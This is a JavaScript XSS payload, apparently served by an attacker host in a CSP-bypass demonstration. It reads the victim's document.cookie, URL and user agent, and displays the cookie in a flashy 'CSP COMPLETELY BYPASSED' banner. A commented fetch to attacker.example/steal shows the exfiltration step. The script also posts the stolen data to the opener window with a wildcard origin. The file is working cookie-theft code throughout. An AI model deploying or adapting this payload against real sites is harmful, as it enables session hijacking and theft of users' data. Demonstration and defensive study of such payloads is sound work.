// Served by the attacker host; loaded once the advanced CSP bypass injects it
// with a stolen nonce.

const stolenCookie = document.cookie;
console.log('Stolen cookie: ' + stolenCookie);

const stolenData = {
    cookie: stolenCookie,
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
};

const alertDiv = document.createElement('div');
alertDiv.style.cssText = `
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: linear-gradient(135deg, #ff0000, #cc0000);
    color: white;
    padding: 30px;
    border-radius: 10px;
    z-index: 999999;
    box-shadow: 0 10px 40px rgba(0,0,0,0.5);
    font-family: Arial, sans-serif;
    max-width: 600px;
    border: 3px solid #fff;
    animation: shake 0.5s;
`;

alertDiv.innerHTML = `
    <h2 style="margin: 0 0 15px 0; font-size: 24px;">CSP COMPLETELY BYPASSED</h2>
    <p style="margin: 10px 0;"><strong>Attacker script executing.</strong></p>
    <p style="margin: 10px 0; font-size: 14px; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px;">
        <strong>Stolen Cookie:</strong><br>
        ${stolenCookie}
    </p>
    <p style="margin: 15px 0 5px 0; font-size: 12px; opacity: 0.9;">
        In a real attack this data would be sent to the attacker.
    </p>
    <button onclick="this.parentElement.remove()" style="
        margin-top: 15px;
        padding: 10px 20px;
        background: white;
        color: #cc0000;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
    ">Close</button>
`;

const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(-50%) translateY(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-50%) translateY(-10px); }
        20%, 40%, 60%, 80% { transform: translateX(-50%) translateY(10px); }
    }
`;
document.head.appendChild(style);
document.body.appendChild(alertDiv);

// A real payload would exfiltrate here, e.g.
// fetch('https://attacker.example/steal', {method: 'POST', body: JSON.stringify(stolenData)})
console.log('Captured data:', stolenData);

// Report back to the attacker dashboard if it opened this window.
try {
    if (window.opener && !window.opener.closed) {
        window.opener.postMessage({ type: 'stolen_data', payload: stolenData }, '*');
    }
} catch (e) {
    // opener not reachable; expected when the victim was opened directly
}
